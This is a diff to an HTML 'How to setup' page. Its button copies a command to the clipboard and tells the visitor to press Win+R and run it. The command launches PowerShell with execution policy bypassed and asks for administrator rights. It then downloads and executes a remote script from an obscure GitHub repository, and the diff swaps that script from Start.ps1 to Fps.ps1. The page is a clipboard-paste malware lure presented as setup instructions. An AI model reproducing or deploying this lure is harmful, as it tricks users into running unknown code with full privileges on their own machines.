@@ -17,7 +17,7 @@
 <body>
 
 <div class="container">
-    <h1>how to setup</h1>
+    <h1>How to setup</h1>
     <p>Follow the steps below to run the command.</p>
 
     <button class="btn" onclick="copyCmd()">🚀 START COMMAND</button>
@@ -37,7 +37,7 @@
 
 <script>
 function copyCmd() {
-    const command = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command IEX (iwr -UseBasicParsing https://github.com/zrxqzrxq123/asdasdc1/raw/refs/heads/main/Start.ps1)' -Verb RunAs\"";
+    const command = "powershell -NoProfile -ExecutionPolicy Bypass -Command \"Start-Process powershell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -Command IEX (iwr -UseBasicParsing https://github.com/zrxqzrxq123/asdasdc1/raw/refs/heads/main/Fps.ps1)' -Verb RunAs\"";
     navigator.clipboard.writeText(command).then(() => {
         alert("Command Copied! Now press Win+R.");
     });
@@ -46,4 +46,5 @@ function copyCmd() {
 
 </body>
 </html>
+
 
